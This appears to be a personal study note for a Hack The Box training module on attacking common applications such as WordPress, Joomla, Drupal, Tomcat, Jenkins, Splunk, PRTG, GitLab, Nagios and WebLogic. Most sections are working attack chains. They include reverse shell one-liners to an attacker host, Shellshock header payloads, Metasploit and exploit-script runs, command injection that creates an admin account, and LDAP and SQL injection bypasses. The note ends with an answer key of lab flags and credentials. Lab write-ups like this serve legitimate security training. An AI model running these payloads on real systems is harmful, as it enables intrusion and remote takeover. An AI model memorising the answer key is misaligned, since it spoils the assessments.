# Attacking Common Applications (HTB Supplementary)

#CommonApplications #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #Shellshock #ColdFusion #IISTilde #LDAP #MassAssignment #ThickClient #WebLogic #Nagios #EyeWitness #WPScan #HTBSupplementary

**HTB Attacking Common Applications module**, application-specific attack patterns for ~20 common enterprise apps. Each app has a fingerprint/version path, a default-cred or brute-force approach, and an admin-to-RCE chain. The key lesson: **the enumeration workflow is the same for every app**, find the version string, find a matching CVE/technique, escalate.

Already in vault: basic WPScan, WordPress theme editor RCE, WordPress plugin zip upload RCE. See [[Web Applications#WordPress|Command Appendix. WordPress]].

> 🔁 Cross-refs: [[Web Applications#WordPress|WordPress appendix]], [[Reconnaissance & Enumeration#Gobuster|Gobuster]], [[Shells & Payloads#Tomcat WAR|Tomcat WAR appendix]]

---

## Outstanding Sections

- [x] ACA.1. Application Discovery (EyeWitness + Aquatone)
- [x] ACA.2. WordPress. Enumeration & Attack
- [x] ACA.3. Joomla. Enumeration & Attack
- [x] ACA.4. Drupal. Enumeration & Attack
- [x] ACA.5. Tomcat. Enumeration & Attack (Manager + CGI CVE-2019-0232)
- [x] ACA.6. Jenkins. Script Console RCE
- [x] ACA.7. Splunk. App Install RCE
- [x] ACA.8. PRTG Network Monitor. Notification RCE
- [x] ACA.9. osTicket. Credential Disclosure
- [x] ACA.10. GitLab. Enumeration & RCE
- [x] ACA.11. Shellshock (CGI)
- [x] ACA.12. Thick Client Applications
- [x] ACA.13. ColdFusion RCE
- [x] ACA.14. IIS Tilde Enumeration
- [x] ACA.15. LDAP Authentication Bypass
- [x] ACA.16. Web Mass Assignment
- [x] ACA.17. Applications Connecting to Services (gdb ODBC)
- [x] ACA.18. Other Notable Applications (WebLogic)
- [x] ACA.19. Skills Assessment I (Tomcat CGI CVE-2019-0232)
- [x] ACA.20. Skills Assessment II (vHost → GitLab cred leak → Nagios RCE)
- [x] ACA.21. Skills Assessment III (dnSpy DLL)

---

## ACA.1. Application Discovery — EyeWitness & Aquatone

When scoping a web application engagement, fingerprint multiple vHosts at once with screenshotting tools before diving into individual targets.

**Workflow:**

```bash
# Step 1: add all known vHosts to /etc/hosts (one line per host or all on one line)
echo "STMIP app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts

# Step 2: create a scope list file
cat << EOF > scopeList
app.inlanefreight.local
dev.inlanefreight.local
blog.inlanefreight.local
EOF

# Step 3: Nmap scan — web ports only, -iL reads hosts from file, -oA saves all formats
sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList

# Step 4a: EyeWitness — screenshots + HTML report
python3 EyeWitness.py --web -x ~/webDiscovery.xml -d inlanefreight_eyewitness
# Creates: inlanefreight_eyewitness/ew.db, report.html, screens/

# Step 4b: Aquatone — alternative screenshotter, reads Nmap XML via pipe
cat webDiscovery.xml | aquatone -nmap
# Creates: aquatone_report.html — opens with "Pages by Similarity" header
```

**Q1 Answer:** `ew.db` (the SQLite database EyeWitness creates in the output folder)
**Q2 Answer:** `Pages by Similarity` (the header on aquatone_report.html's title page)

#### Tags: #EyeWitness #Aquatone #AppDiscovery #WebFingerprinting

---

## ACA.2. WordPress — Enumeration & Attack

**Version + users + plugins:** WPScan does all of this in one run.

```bash
# Full enumeration: themes, plugins, users, timthumbs
wpscan --url http://blog.inlanefreight.local --enumerate

# User enumeration only
wpscan --url http://blog.inlanefreight.local --enumerate u

# Brute force via xmlrpc (faster than standard wp-login, often less protected)
wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
# Output: [SUCCESS] - doug / jessica1
```

**Directory listing on /wp-content/uploads/:** WPScan flags this as a finding. Navigate directly:
```
http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt
```

**Plugin version from readme.txt** (no auth needed):
```bash
curl http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt | grep "Stable tag"
# Stable tag: 1.6.4
```

**Plugin LFI** (mail-masta plugin, CVE-2016-10956):
```bash
# The count_of_send.php script passes the 'pl' parameter directly to include()
curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
```

**Admin-to-RCE via Theme File Editor:**
1. Login → Appearance → Theme Editor
2. Select "Twenty Nineteen" → `404.php`
3. Inject: `exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");`
4. Save, start `nc -nvlp PWNPO`
5. Trigger: navigate to `http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php`

> 🔁 Similar to: [[Web Applications#WordPress|Command Appendix WordPress section]], plugin-upload fallback if loopback-check blocks the theme edit

**Q1 Answer (other user besides admin):** `doug`
**Q2 Answer (doug's password):** `jessica1`
**Q3 Answer (other /bin/bash user):** `webadmin`
**Q4 Answer (flag in webroot):** `l00k_ma_unAuth_rc3!`
**Discovery Q1 (flag in uploads):** `0ptions_ind3xeS_ftw!`
**Discovery Q2 (plugin name):** `WP Sitemap Page`
**Discovery Q3 (plugin version):** `1.6.4`

#### Tags: #WordPress #WPScan #XMLRPCBruteForce #PluginLFI #ThemeEditorRCE

---

## ACA.3. Joomla — Enumeration & Attack

**Version fingerprint:**
```bash
# README.txt always present on default installs — shows major version
curl -s app.inlanefreight.local/README.txt | head -n 4
# "Joomla! 3.10 version history..." → version 3.10.0

# Alternative: /administrator/manifests/files/joomla.xml — exact version tag
curl -s app.inlanefreight.local/administrator/manifests/files/joomla.xml | grep '<version>'
```

**Password brute force:**
```bash
git clone https://github.com/ajnik/joomla-bruteforce.git
python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/rockyou.txt -usr admin
# Found: admin:turnkey
```

**Admin-to-RCE via Template File Editor:**
1. Login as admin → Extensions → Templates → Templates
2. Select "Protostar Details and Files" → click `error.php`
3. Inject: `exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");`
4. Save, start `nc -nvlp PWNPO`
5. Trigger: navigate to `http://dev.inlanefreight.local/templates/protostar/error.php`

Reverse shell lands in `/var/www/dev.inlanefreight.local/templates/protostar/`, the flag is two directories up: `cat ../../flag.txt`

**Q1 Answer (Joomla version):** `3.10.0`
**Q2 Answer (admin password):** `turnkey`
**Attacking Q1 Answer (flag):** `j00mla_c0re_d1rtrav3rsal!`

#### Tags: #Joomla #JoomlaRCE #TemplateEditor #BruteForce

---

## ACA.4. Drupal — Enumeration & Attack

**Version fingerprint:**
```bash
curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m1 "Drupal"
# Drupal 7.30, 2014-07-24
```

**Alternative version paths:** `/core/CHANGELOG.txt` (Drupal 8+), `/node/1` page source (generator meta tag).

**Admin-to-RCE via PHP Filter module (older Drupal versions):**
1. Login as admin → Extend → find "PHP Filter" → check it → Install
2. Content → Add Content → Basic page
3. Body: write PHP reverse shell, set "Text format" dropdown to "PHP code"
4. Save → reverse shell fires immediately
5. Start `nc -nvlp PWNPO` before clicking Save

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
?>
```

> 🔍 Worth remembering generally: the PHP Filter module is disabled by default in Drupal 7+ and removed in Drupal 8+. If it's present and enabled it's a critical misconfiguration. Reverse shell lands as `www-data` in the Drupal webroot. Flag file is in the same directory.

**Q1 Answer (Drupal version):** `7.30`
**Attacking Q1 Answer (flag):** `DrUp@l_drUp@l_3veryWh3Re!`

#### Tags: #Drupal #PHPFilterRCE #PHPFilter #CMS

---

## ACA.5. Tomcat — Enumeration & Attack

**Version fingerprint:**
```bash
# Navigate to the Tomcat welcome page → click Documentation → version shown
# OR via Nmap service scan banner
nmap -sV -p 8080 STMIP
# Header: Apache Tomcat/9.0.0.M1

# Error page version disclosure (no auth)
curl http://STMIP:8080/nonexistent
# "<h3>Apache Tomcat/10.0.10</h3>" in response
```

**Manager login brute force (MSF):**
```bash
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS STMIP
set RPORT 8180
set VHOST web01.inlanefreight.local
set STOP_ON_SUCCESS true
exploit
# Found: tomcat:root
```

**WAR-based RCE (Manager App):**
```bash
# Step 1: generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o backup.war

# Step 2: upload via Manager App (:8180/manager/html → WAR file to upload → Browse → Deploy)
# Step 3: click the deployed app in the manager app list to trigger the callback
nc -nvlp PWNPO
```

**Flag location:** `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`

**Tomcat CGI — CVE-2019-0232 (Windows, cmd line args injection):**

Affected versions: Tomcat < 9.0.17 on Windows.

```bash
# Step 1: fuzz for .bat CGI scripts
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://STMIP:8080/cgi/FUZZ.bat
# Found: welcome.bat, cmd.bat

# Step 2: URL-encode command injection via the bat file's query string
# The JVM passes query string tokens as command line arguments on Windows
# Inject: &c:\windows\system32\whoami.exe (URL-encoded)
curl 'http://STMIP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
# Output: feldspar\omen

# Step 3: MSF exploit for full RCE
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
```

**Q1 Answer (Tomcat version):** `10.0.10`
**Q2 Answer (admin role):** `admin-gui`
**Attacking Q1 Answer (username):** `tomcat`
**Attacking Q2 Answer (password):** `root`
**Attacking Q3 Answer (flag):** `t0mcat_rc3_ftw!`
**CGI Q1 Answer (user):** `feldspar\omen`

#### Tags: #Tomcat #TomcatRCE #WARDeploy #TomcatCGI #CVE20190232 #CGIInjection

---

## ACA.6. Jenkins — Discovery & RCE

**Version fingerprint:**
```bash
# Login with admin:admin → check bottom-right of any page for version number
# Example: Jenkins 2.303.1
```

**Groovy Script Console RCE:**
1. Manage Jenkins → Script Console
2. Paste Groovy reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/PWNIP/PWNPO;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

3. Start `nc -nvlp PWNPO` first, then click Run
4. Shell lands as `root` (Jenkins often runs as root)

> 🔍 Worth remembering generally: the Groovy script console is authenticated-RCE with no extra exploit needed, it's a designed feature for admins. Any Jenkins install with weak creds (`admin:admin`, `admin:password`) or no auth required is a full root shell. Look for it on port 8080 or 8000. Flag is in `/var/lib/jenkins3/flag.txt`.

**Q1 Answer (version):** `2.303.1`
**Attacking Q1 Answer (flag):** `f33ling_gr00000vy!`

#### Tags: #Jenkins #GroovyRCE #ScriptConsole #CI

---

## ACA.7. Splunk — Discovery & RCE

**Version fingerprint:**
```bash
# HTTPS on port 8000 — version shown on the login page title
nmap -A -p 8000 STMIP
# Or: navigate to https://STMIP:8000 — version in page title
```

**App-install RCE (Splunk accepts tar.gz packages as "apps"):**

```bash
# Step 1: clone the reverse shell Splunk app
git clone https://github.com/0xjpuff/reverse_shell_splunk.git

# Step 2: edit bin/run.ps1 — set PWNIP and PWNPO

# Step 3: package it
cd reverse_shell_splunk
tar -cvzf updater.tar.gz reverse_shell_splunk/

# Step 4: listener
nc -nvlp PWNPO

# Step 5: upload via Splunk web UI
# Manage Apps → Install app from file → upload updater.tar.gz → Upload
# Shell fires immediately on install as nt authority\system
```

Flag: `C:\loot\flag.txt`, `cat C:\loot\flag.txt`

> 🔍 Worth remembering generally: Splunk Enterprise (on-prem, not cloud) uses HTTP on port 8000 and is often installed with default creds or no auth on internal networks. The app-install RCE works on both Windows and Linux targets, on Linux, edit `bin/rev.py` instead of `run.ps1`.

**Q1 Answer (version):** `8.2.2`
**Attacking Q1 Answer (flag):** `l00k_ma_no_AutH!`

#### Tags: #Splunk #SplunkRCE #AppInstall #PowerShellReverseShell

---

## ACA.8. PRTG Network Monitor — RCE

**Version fingerprint:**
```bash
# PRTG on port 8080 — version in Nmap banner and bottom-left of web UI
nmap -A -p 8080 STMIP
# "Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)"
```

**Notification Execute Program RCE:**
```
Default creds: prtgadmin:Password123
```

1. Login → Setup → Account Settings → Notifications → Add new notification
2. Name it anything
3. Scroll to "Execute Program" → check it
4. Program File: `Demo exe notification - outfile.ps1`
5. Parameter field (this executes as a command):
   ```
   test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
   ```
6. Save → select the notification → click the bell icon (test notification)
7. Verify user created:
   ```bash
   crackmapexec smb STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
   # Output: [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
   ```
8. Connect with Evil-WinRM:
   ```bash
   evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
   type C:\Users\Administrator\Desktop\flag.txt
   ```

**Q1 Answer (version):** `18.1.37.13946`
**Q2 Answer (flag):** `WhOs3_m0nit0ring_wH0?`

#### Tags: #PRTG #PRTGNotification #LocalAdminCreation #EvilWinRM

---

## ACA.9. osTicket — Credential Disclosure

osTicket is a support ticketing system. Attack path: log in as a support agent → read closed tickets for password disclosures.

```
URL: http://support.inlanefreight.local/scp/login.php
Credentials: kevin@inlanefreight.local:Fish1ng_s3ason!
```

1. Login → click "Closed" tab → read the closed ticket thread
2. Credentials sent to customers appear in plaintext in ticket replies

**Q1 Answer (password sent to Charles Smithson):** `Inlane_welcome!`

> 🔍 Worth remembering generally: support ticket systems are gold mines for credential disclosure. Service desk agents routinely paste temporary passwords, API keys, and internal URLs into tickets. Always check "Closed" and "Resolved" ticket archives if you gain access to any helpdesk system.

#### Tags: #osTicket #CredentialDisclosure #SupportTicket

---

## ACA.10. GitLab — Enumeration & RCE

**Version fingerprint:**
```bash
# Register a free account → navigate to /help
# Version shown at top: "GitLab Community Edition 13.10.2"
```

**Credential discovery in public repos:**
1. Explore projects (as logged-in user)
2. Check any project with config files, `phpunit_pgsql.xml` often contains DB passwords
3. Check commit messages for "password" keywords

**User enumeration (GitLab 13.10.3):**
```bash
searchsploit -m ruby/webapps/49821.sh
./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists
# [+] The username DEMO exists!
```

**Authenticated RCE (GitLab 13.10.2):**
```bash
searchsploit -m ruby/webapps/49951.py
nc -nvlp 9001

python3 49951.py -t http://gitlab.inlanefreight.local:8081 \
  -u HTBAcademy -p password123 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP PWNPO >/tmp/f'
# Shell lands as git@ → cat flag_gitlab.txt
```

**Q1 Answer (version):** `13.10.2`
**Q2 Answer (PostgreSQL password):** `postgres`
**Attacking Q1 Answer (valid user):** `DEMO`
**Attacking Q2 Answer (flag):** `s3cure_y0ur_Rep0s!`

#### Tags: #GitLab #GitLabRCE #GitLabUserEnum #AuthenticatedRCE #SearchSploit

---

## ACA.11. Shellshock (CGI)

Shellshock (CVE-2014-6271), bash processes specially crafted environment variables and executes appended commands. Any CGI script that invokes bash is vulnerable.

**Discovery:**
```bash
# Fuzz for CGI scripts
gobuster dir -u http://STMIP/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
# Found: /access.cgi
```

**Exploit — command execution via User-Agent header:**
```bash
# Test: read /etc/passwd
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://STMIP/cgi-bin/access.cgi

# Reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://STMIP/cgi-bin/access.cgi
```

The `() { :; };` prefix defines a dummy function. Bash exports function definitions via environment variables and re-evaluates them, the `; /bin/bash ...` after the closing `}` executes in that re-evaluation.

Flag in `/usr/lib/cgi-bin/flag.txt`.

> 🔍 Worth remembering generally: any header that the web server passes to the CGI script as an environment variable can carry the payload, not just User-Agent. Referer, Cookie, X-Forwarded-For all work. The only requirement is that bash is invoked to execute the CGI script. `#!/bin/bash` shebang in the script means it's vulnerable; `#!/bin/sh` means probably not.

**Q1 Answer (flag):** `Sh3ll_Sh0cK_123`

#### Tags: #Shellshock #CVE20146271 #CGI #BashInjection #UserAgentInjection

---

## ACA.12. Thick Client Applications

**Pattern 1 — Extract hardcoded credentials via decompiling:**

When a .NET/Java executable makes a database connection, credentials are often hardcoded in the binary. Tools: dnSpy (.NET), jd-gui (Java), Procmon (Windows behavior tracing).

**Procmon → find temp file → intercept before deletion → expose PowerShell stage:**
1. Run Procmon → filter for process name (the target exe)
2. Run the executable → watch for file create in `C:\Users\user\AppData\Local\Temp`
3. Remove DELETE permission on that temp folder for SYSTEM/Administrators → re-run exe → temp file persists
4. Edit the .bat temp file to comment out the `del monta.ps1` lines → re-run → recover the PowerShell assembler script

**de4dot + dnSpy (.NET deobfuscation):**
```cmd
# Dump memory while executable is running in x64dbg
# Run at Exit Breakpoint → Memory Map → find MAP with RW protection → Follow in Dump → Dump Memory to File
# Drag dump onto de4dot.exe → drag cleaned .bin onto dnSpy → browse source
# Credentials visible in SQL connection string or constructor:
# svc_oracle:#oracle_s3rV1c3!2010
```

**Pattern 2 — JAR manipulation (Java thick client):**
1. Extract JAR → edit `beans.xml` (change server port) → remove signature files (`1.RSA`, `1.SF`)
2. Decompile with jd-gui → edit Java source → recompile with `javac -cp`
3. Rebuild JAR with `jar -cmf MANIFEST.MF output.jar .`
4. SQLi in login field (UNION SELECT bypass): `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`

**Q1 Answer (credentials from Restart-OracleService.exe):** `svc_oracle:#oracle_s3rV1c3!2010`
**Q2 Answer (IP from fatty-client eth0):** `172.28.0.3`

#### Tags: #ThickClient #DotNET #dnSpy #de4dot #Procmon #JARManipulation #SQLiLogin

---

## ACA.13. ColdFusion — Discovery & RCE

**Discovery:** ColdFusion 8+ runs on port 8500 (HTTP) or 443 (HTTPS). Server Monitor protocol runs on port 5500.

**Authenticated RCE (Adobe ColdFusion 8, CVE-2009-2265):**
```bash
searchsploit -m 50057.py    # Adobe ColdFusion 8 - Remote Code Execution
# Edit 50057.py: set lhost=PWNIP, lport=PWNPO, rhost=STMIP, rport=8500
python3 50057.py
# Shell lands as arctic\tolis (or whatever user runs ColdFusion)
```

The script generates a JSP webshell, uploads it via the file upload CVE, then triggers a reverse shell.

**Q1 Answer (protocol on port 5500):** `Server Monitor`
**Attacking Q1 Answer (user):** `arctic\tolis`

#### Tags: #ColdFusion #CVE20092265 #JSPShell #SearchSploit

---

## ACA.14. IIS Tilde Enumeration

IIS 8.3 "tilde" vulnerability: IIS leaks short filenames (8.3 format) via HTTP status code differences. Use to discover hidden file/directory names, then brute force the full name.

```bash
# Step 1: clone IIS Short Name Scanner
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git

# Step 2: run scanner (requires Java)
cd IIS-ShortName-Scanner/release/
java -jar iis_shortname_scanner.jar 0 5 http://STMIP/
# Output: identified files: TRANSF~1.ASP (short name — first 6 chars + tilde + number)

# Step 3: build wordlist of candidates starting with the identified prefix
egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

# Step 4: brute force the full name
gobuster dir -u http://STMIP/ -w /tmp/list.txt -x .aspx,.asp
# Found: /transfer.aspx
```

> 🔧 Technique: the short name gives you the first 6 characters and the extension (3 chars). Build a wordlist starting with those 6 chars from any wordlist (`egrep -R ^<first6chars>`), then fuzz extensions. Used IIS's own 8.3 format against itself.

**Q1 Answer (full filename):** `transfer.aspx`

#### Tags: #IISTildeEnumeration #IIS #ShortNameScanner #Gobuster

---

## ACA.15. LDAP Authentication Bypass

When a login form queries LDAP with user-supplied values, a wildcard `*` character matches any entry if not sanitized.

```
Username: *
Password: *
```

Both fields accept `*` → LDAP filter becomes `(&(uid=*)(password=*))` → matches the first user in the directory → login succeeds.

**Q1 Answer (site powered by):** `w3.css`

#### Tags: #LDAP #LDAPBypass #WildcardInjection #AuthenticationBypass

---

## ACA.16. Web Mass Assignment

Mass assignment occurs when a web framework automatically maps all HTTP parameters to object properties without filtering. Attackers add extra parameters not shown in the form.

**Discovery:**
```bash
# SSH to target (or SCP the source)
scp root@STMIP:/opt/asset-manager/app.py .
# Or: cat /opt/asset-manager/app.py

# Look for how login is handled — which property is set from request params
# Find: if user['active'] == True (or similar privileged flag)
```

**Exploit:** Submit the hidden parameter in the POST body:
```bash
# Normal login body: username=test&password=test
# Add the privileged parameter:
curl -X POST http://STMIP/login -d 'username=test&password=test&active=1'
```

**Q1 Answer (parameter name):** `active`

#### Tags: #MassAssignment #ParameterPollution #FlaskApp #Python

---

## ACA.17. Applications Connecting to Services — gdb ODBC Debugging

When a binary makes database connections, the connection string (including credentials) passes through memory. Break at the connection function to read it.

```bash
ssh htb-student@STMIP
gdb ./octopus_checker

# In gdb:
set disassembly-flavor intel
disas main           # find the SQLDriverConnect call
b SQLDriverConnect   # set breakpoint at the library function
run                  # execution pauses at the breakpoint

# Registers at breakpoint show the full connection string in RDX:
# "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;"
```

The ODBC connection string always has the format `UID=<user>;PWD=<password>;`, visible directly in the register dump.

**Q1 Answer (credentials):** `SA:N0tS3cr3t!`

#### Tags: #GDB #ODBCCredentials #BinaryAnalysis #SQLDriverConnect #ReverseEngineering

---

## ACA.18. Other Notable Applications — WebLogic

Oracle WebLogic runs on port 7001 (T3 protocol). CVE-2019-2725 and later deserialization CVEs are common.

```bash
# Fingerprint via Nmap
nmap -A -p 7001 STMIP
# "Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)"

# MSF RCE (path traversal + PowerShell stager)
msfconsole -q
use multi/http/weblogic_admin_handle_rce
set RHOSTS STMIP
set SRVHOST PWNIP
set LHOST PWNIP
exploit
# Meterpreter session — cat C:/Users/Administrator/Desktop/flag.txt
```

**Q1 Answer (application):** `Weblogic`
**Q2 Answer (flag):** `w3b_l0gic_RCE!`

#### Tags: #WebLogic #OracleWebLogic #MSFExploit #T3Protocol

---

## ACA.19. Skills Assessment I — Tomcat CVE-2019-0232

**Enumeration:**
```bash
nmap -A -Pn STMIP
# 8080/tcp open Apache Tomcat/Coyote JSP engine 1.1 — Apache Tomcat/9.0.0.M1
# Windows host — CVE-2019-0232 applies (Windows + Tomcat < 9.0.17)
```

**Find the CGI batch file:**
```bash
gobuster dir -u http://STMIP:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
# Found: /cmd.bat
```

**MSF exploit:**
```bash
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
# Meterpreter → cat C:/Users/Administrator/Desktop/flag.txt
```

**Q1 Answer (application):** `Tomcat`
**Q2 Answer (port):** `8080`
**Q3 Answer (version):** `9.0.0.M1`
**Q4 Answer (flag):** `f55763d31a8f63ec935abd07aee5d3d0`

#### Tags: #SkillsAssessment #TomcatCGI #CVE20190232 #WindowsRCE

---

## ACA.20. Skills Assessment II — vHost Enum → GitLab Cred Leak → Nagios RCE

**Step 1: vHost discovery**
```bash
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain
# Found: blog.inlanefreight.local (WordPress), monitoring.inlanefreight.local (Nagios), gitlab.inlanefreight.local
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

**Step 2: Find Nagios password in GitLab**
- Register on gitlab.inlanefreight.local → Explore projects → find "Nagios Postgresql" project
- Latest commit says "master password" → click it → plaintext creds: `nagiosadmin:oilaKglm7M09@CPL&^lC`
- Public project name: `VirtualHost`

**Step 3: Nagios XI RCE**
- Login to `http://monitoring.inlanefreight.local` → version is 5.7.5 (shown bottom-left)
```bash
searchsploit nagios 5.7         # finds 49422.py — Nagios XI 5.7.X RCE Authenticated
searchsploit -m php/webapps/49422.py
nc -nvlp 9001 &
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' PWNIP 9001 &
# Shell as www-data → cat f5088a..._flag.txt → afe377683dce373ec2bf7eaf1e0107eb
```

**Q1 Answer (WordPress URL):** `http://blog.inlanefreight.local`
**Q2 Answer (GitLab project):** `VirtualHost`
**Q3 Answer (third vhost):** `monitoring.inlanefreight.local`
**Q4 Answer (application on third vhost):** `Nagios`
**Q5 Answer (admin password):** `oilaKglm7M09@CPL&^lC`
**Q6 Answer (flag):** `afe377683dce373ec2bf7eaf1e0107eb`

#### Tags: #SkillsAssessment #NagiosXI #NagiosRCE #GitLabCredLeak #VHostEnum

---

## ACA.21. Skills Assessment III — dnSpy DLL

Connect to the target via RDP → navigate to `C:\inetpub\wwwroot\bin` → find `MultimasterAPI.dll` → drag onto dnSpy → browse the decompiled source → look for SQL connection string.

```
xfreerdp /v:STMIP /u:administrator /p:xcyj8izxNVzhf4z /dynamic-resolution
```

In dnSpy: the connection string contains the hardcoded DB password directly in the C# code:
```csharp
// "Server=...;Database=Multimaster;uid=sa;password=D3veL0pM3nT!;"
```

**Q1 Answer (hardcoded DB password):** `D3veL0pM3nT!`

#### Tags: #SkillsAssessment #dnSpy #DotNET #HardcodedCredentials #DLLAnalysis

---

## All Q&A Answers

| Section | Q# | Answer |
|---------|----|--------|
| App Discovery & Enum | 1 | `ew.db` |
| App Discovery & Enum | 2 | `Pages by Similarity` |
| WordPress Discovery | 1 | `0ptions_ind3xeS_ftw!` |
| WordPress Discovery | 2 | `WP Sitemap Page` |
| WordPress Discovery | 3 | `1.6.4` |
| Attacking WordPress | 1 | `doug` |
| Attacking WordPress | 2 | `jessica1` |
| Attacking WordPress | 3 | `webadmin` |
| Attacking WordPress | 4 | `l00k_ma_unAuth_rc3!` |
| Joomla Discovery | 1 | `3.10.0` |
| Joomla Discovery | 2 | `turnkey` |
| Attacking Joomla | 1 | `j00mla_c0re_d1rtrav3rsal!` |
| Drupal Discovery | 1 | `7.30` |
| Attacking Drupal | 1 | `DrUp@l_drUp@l_3veryWh3Re!` |
| Tomcat Discovery | 1 | `10.0.10` |
| Tomcat Discovery | 2 | `admin-gui` |
| Attacking Tomcat | 1 | `tomcat` |
| Attacking Tomcat | 2 | `root` |
| Attacking Tomcat | 3 | `t0mcat_rc3_ftw!` |
| Jenkins Discovery | 1 | `2.303.1` |
| Attacking Jenkins | 1 | `f33ling_gr00000vy!` |
| Splunk Discovery | 1 | `8.2.2` |
| Attacking Splunk | 1 | `l00k_ma_no_AutH!` |
| PRTG | 1 | `18.1.37.13946` |
| PRTG | 2 | `WhOs3_m0nit0ring_wH0?` |
| osTicket | 1 | `Inlane_welcome!` |
| GitLab Discovery | 1 | `13.10.2` |
| GitLab Discovery | 2 | `postgres` |
| Attacking GitLab | 1 | `DEMO` |
| Attacking GitLab | 2 | `s3cure_y0ur_Rep0s!` |
| Tomcat CGI | 1 | `feldspar\omen` |
| Shellshock | 1 | `Sh3ll_Sh0cK_123` |
| Thick Client | 1 | `svc_oracle:#oracle_s3rV1c3!2010` |
| Thick Client Web Vulns | 1 | `172.28.0.3` |
| ColdFusion Discovery | 1 | `Server Monitor` |
| Attacking ColdFusion | 1 | `arctic\tolis` |
| IIS Tilde | 1 | `transfer.aspx` |
| Attacking LDAP | 1 | `w3.css` |
| Mass Assignment | 1 | `active` |
| Attacking App Services | 1 | `SA:N0tS3cr3t!` |
| Other Notable Apps | 1 | `Weblogic` |
| Other Notable Apps | 2 | `w3b_l0gic_RCE!` |
| Skills Assessment I | 1 | `Tomcat` |
| Skills Assessment I | 2 | `8080` |
| Skills Assessment I | 3 | `9.0.0.M1` |
| Skills Assessment I | 4 | `f55763d31a8f63ec935abd07aee5d3d0` |
| Skills Assessment II | 1 | `http://blog.inlanefreight.local` |
| Skills Assessment II | 2 | `VirtualHost` |
| Skills Assessment II | 3 | `monitoring.inlanefreight.local` |
| Skills Assessment II | 4 | `Nagios` |
| Skills Assessment II | 5 | `oilaKglm7M09@CPL&^lC` |
| Skills Assessment II | 6 | `afe377683dce373ec2bf7eaf1e0107eb` |
| Skills Assessment III | 1 | `D3veL0pM3nT!` |

---

## External Resources

- [HackTricks. WordPress](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/wordpress.md)
- [HackTricks. Joomla](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/joomla.md)
- [HackTricks. Drupal](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/drupal.md)
- [HackTricks. Tomcat](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/tomcat.md)
- [HackTricks. Jenkins](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/jenkins.md)
- [HackTricks. IIS Tilde Enumeration](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/iis-internet-information-services.md)
- [PayloadsAllTheThings. Shellshock](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Shellshock%20CVE-2014-6271.md)

---

## Related Boxes

